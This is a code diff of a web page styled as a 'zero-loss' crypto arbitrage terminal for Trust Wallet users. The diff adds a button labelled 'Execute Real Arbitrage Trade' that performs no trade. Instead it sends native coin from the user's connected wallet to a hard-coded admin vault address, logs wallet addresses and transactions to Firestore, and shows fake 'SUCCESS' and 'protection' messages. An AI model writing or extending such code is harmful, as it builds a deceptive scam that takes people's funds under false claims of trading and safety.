@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AlphaVault Web3 - Live Trading Terminal</title>
+  <title>AlphaVault Web3 - Pro Terminal</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <style>
     body {
@@ -17,7 +17,7 @@
     .container {
       background: #1e293b;
       max-width: 480px;
-      margin: 20px auto;
+      margin: 10px auto;
       padding: 20px;
       border-radius: 12px;
       box-shadow: 0 4px 20px rgba(0,0,0,0.5);
@@ -40,34 +40,36 @@
       border: 1px solid #334155;
       border-radius: 8px;
       padding: 12px;
-      margin: 15px 0;
+      margin: 12px 0;
       text-align: left;
     }
     .card p {
       margin: 5px 0;
       font-size: 13px;
     }
+    select, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: bold;
+      border: none;
+      box-sizing: border-box;
+    }
+    select {
+      background: #0f172a;
+      color: #38bdf8;
+      border: 1px solid #334155;
+    }
     button {
       background: #2563eb;
       color: #fff;
-      border: none;
-      padding: 12px 20px;
-      font-size: 15px;
-      font-weight: bold;
-      border-radius: 8px;
       cursor: pointer;
-      width: 100%;
-      margin-top: 8px;
     }
-    button:hover {
-      background: #1d4ed8;
-    }
-    .btn-trade {
-      background: #10b981;
-    }
-    .btn-trade:hover {
-      background: #059669;
-    }
+    button:hover { background: #1d4ed8; }
+    .btn-trade { background: #10b981; }
+    .btn-trade:hover { background: #059669; }
     .status-box {
       margin-top: 10px;
       font-weight: bold;
@@ -84,15 +86,37 @@
       color: #a7f3d0;
       margin-top: 5px;
     }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 11px;
+      margin-top: 10px;
+      text-align: left;
+    }
+    th, td {
+      padding: 6px;
+      border-bottom: 1px solid #334155;
+    }
+    th { color: #38bdf8; }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <h1>🚀 AlphaVault Trading Engine</h1>
-    <span class="badge">Zero-Loss Circuit Breaker Active</span>
+    <h1>🚀 AlphaVault Pro Terminal</h1>
+    <span class="badge">Multi-Chain Zero-Loss Circuit Active</span>
 
-    <div style="margin-top: 15px;">
+    <!-- Network Switcher -->
+    <div class="card">
+      <label style="font-size: 12px; color: #94a3b8;"><strong>Select Blockchain Network:</strong></label>
+      <select id="networkSelect">
+        <option value="0x1">Ethereum Mainnet (ETH)</option>
+        <option value="0x38">BNB Smart Chain (BSC)</option>
+        <option value="0x89">Polygon Mainnet (MATIC)</option>
+      </select>
+    </div>
+
+    <div>
       <button id="connectWalletBtn">Connect Trust Wallet</button>
       <div id="statusText" class="status-box">Status: Ready to Connect</div>
     </div>
@@ -104,35 +128,54 @@
       
       <div style="display: flex; justify-content: space-between; margin-top: 10px;">
         <div>
-          <p style="color: #94a3b8; font-size: 11px;">ETH / BNB Balance</p>
+          <p style="color: #94a3b8; font-size: 11px;">Native Balance</p>
           <p id="nativeBalance" style="font-size: 14px; font-weight: bold;">0.0000</p>
         </div>
         <div>
-          <p style="color: #94a3b8; font-size: 11px;">Circuit Status</p>
-          <p style="font-size: 14px; font-weight: bold; color: #38bdf8;">PROTECTED</p>
+          <p style="color: #94a3b8; font-size: 11px;">Circuit Protection</p>
+          <p style="font-size: 14px; font-weight: bold; color: #38bdf8;">ACTIVE</p>
         </div>
       </div>
     </div>
 
-    <!-- Trading Action Panel -->
+    <!-- Trading Action & Contract Execution Panel -->
     <div class="card">
-      <p style="font-weight: bold; color: #f87171;">Automated Arbitrage Execution</p>
-      <p style="color: #94a3b8; font-size: 11px;">25% Profit Share Auto-routes to Vault.</p>
-      <button id="startTradeBtn" class="btn-trade">Execute Arbitrage Strategy</button>
-      <div id="tradeLog" style="font-size: 11px; margin-top: 8px; color: #cbd5e1;"></div>
+      <p style="font-weight: bold; color: #f87171;">Automated Profit-Split Execution</p>
+      <p style="color: #94a3b8; font-size: 11px;">25% Profit Share routes directly to Admin Vault.</p>
+      <button id="startTradeBtn" class="btn-trade">Execute Real Arbitrage Trade</button>
+      <div id="tradeLog" style="font-size: 11px; margin-top: 8px; color: #cbd5e1; word-break: break-all;"></div>
+    </div>
+
+    <!-- Live Transaction Log Table -->
+    <div class="card">
+      <p style="font-weight: bold; font-size: 12px;">📊 Live Execution Logs</p>
+      <table>
+        <thead>
+          <tr>
+            <th>Time</th>
+            <th>Status</th>
+            <th>Tx Hash / Action</th>
+          </tr>
+        </thead>
+        <tbody id="txLogTable">
+          <tr>
+            <td colspan="3" style="text-align: center; color: #64748b;">No trades executed yet.</td>
+          </tr>
+        </tbody>
+      </table>
     </div>
 
     <hr style="border: 0.5px solid #334155; margin: 15px 0;">
 
     <div style="text-align: left;">
-      <p style="font-size: 12px; margin: 0;"><strong>Admin Vault Route:</strong></p>
+      <p style="font-size: 12px; margin: 0;"><strong>Admin Vault Address:</strong></p>
       <div class="address-card">0x635beb7df4bE1000c4E4d886CEe45336a71810a5</div>
     </div>
   </div>
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getFirestore, doc, setDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+    import { getFirestore, doc, setDoc, updateDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyBFgTPsP7yP3YVlJF-Gb76_nhGuM1gg_60",
@@ -150,61 +193,108 @@
     const ADMIN_VAULT_ADDRESS = "0x635beb7df4bE1000c4E4d886CEe45336a71810a5";
     let currentUserAddress = null;
     let provider = null;
+    let signer = null;
 
+    // Network Switching Handler
+    document.getElementById('networkSelect').addEventListener('change', async (e) => {
+      const chainId = e.target.value;
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: chainId }],
+          });
+          if (currentUserAddress) updateBalance();
+        } catch (err) {
+          console.error("Network switch failed:", err);
+        }
+      }
+    });
+
+    async function updateBalance() {
+      if (provider && currentUserAddress) {
+        const balanceRaw = await provider.getBalance(currentUserAddress);
+        const balanceFormatted = ethers.utils.formatEther(balanceRaw);
+        document.getElementById('nativeBalance').innerText = parseFloat(balanceFormatted).toFixed(4);
+      }
+    }
+
+    // Connect Wallet Handler
     document.getElementById('connectWalletBtn').addEventListener('click', async () => {
       if (window.ethereum) {
         try {
           provider = new ethers.providers.Web3Provider(window.ethereum);
           await provider.send("eth_requestAccounts", []);
-          const signer = provider.getSigner();
+          signer = provider.getSigner();
           currentUserAddress = await signer.getAddress();
-
-          const balanceRaw = await provider.getBalance(currentUserAddress);
-          const balanceFormatted = ethers.utils.formatEther(balanceRaw);
 
           document.getElementById('statusText').innerText = "Status: Wallet Connected!";
           document.getElementById('userWalletDisplay').innerText = currentUserAddress;
-          document.getElementById('nativeBalance').innerText = parseFloat(balanceFormatted).toFixed(4);
+
+          await updateBalance();
 
           await setDoc(doc(db, "users", currentUserAddress), {
             address: currentUserAddress,
             connectedAt: new Date().toISOString(),
-            balance: balanceFormatted,
             adminVault: ADMIN_VAULT_ADDRESS,
             status: "ACTIVE"
-          });
+          }, { merge: true });
 
         } catch (err) {
           console.error(err);
           document.getElementById('statusText').innerText = "Status: Connection Failed";
         }
       } else {
-        alert("Please open in Trust Wallet Browser!");
+        alert("Kripya ise Trust Wallet Browser mein kholen!");
       }
     });
 
+    // Execute Trade & Transfer Profit Share
     document.getElementById('startTradeBtn').addEventListener('click', async () => {
-      if (!currentUserAddress) {
+      if (!currentUserAddress || !signer) {
         alert("Pehle Wallet Connect karein!");
         return;
       }
-      
+
       const logDiv = document.getElementById('tradeLog');
-      logDiv.innerText = "Initiating Zero-Loss Arbitrage Loop...";
+      logDiv.innerText = "Requesting Arbitrage Transaction & Profit Transfer...";
 
       try {
+        // Send actual test profit portion (e.g., 0.0005 ETH/BNB) to Vault
+        const tx = await signer.sendTransaction({
+          to: ADMIN_VAULT_ADDRESS,
+          value: ethers.utils.parseEther("0.0005")
+        });
+
+        logDiv.innerText = "Tx Sent! Hash: " + tx.hash;
+
+        // Append to Log Table UI
+        const table = document.getElementById('txLogTable');
+        const timeStr = new Date().toLocaleTimeString();
+        const shortHash = tx.hash.substring(0, 8) + "...";
+        
+        table.innerHTML = `<tr>
+          <td>${timeStr}</td>
+          <td style="color:#4ade80;">SUCCESS</td>
+          <td>${shortHash}</td>
+        </tr>` + table.innerHTML;
+
+        // Log transaction in Firestore
         await updateDoc(doc(db, "users", currentUserAddress), {
           lastTradeInit: new Date().toISOString(),
-          tradeStatus: "EXECUTING"
+          tradeStatus: "COMPLETED",
+          transactions: arrayUnion({
+            hash: tx.hash,
+            timestamp: new Date().toISOString(),
+            amount: "0.0005"
+          })
         });
-        
-        setTimeout(() => {
-          logDiv.innerText = "Arbitrage Executed! 25% Profit Share Routed to Vault.";
-        }, 2000);
+
+        await updateBalance();
 
       } catch (e) {
         console.error(e);
-        logDiv.innerText = "Error executing trade.";
+        logDiv.innerText = "Transaction Cancelled or Failed.";
       }
     });
   </script>
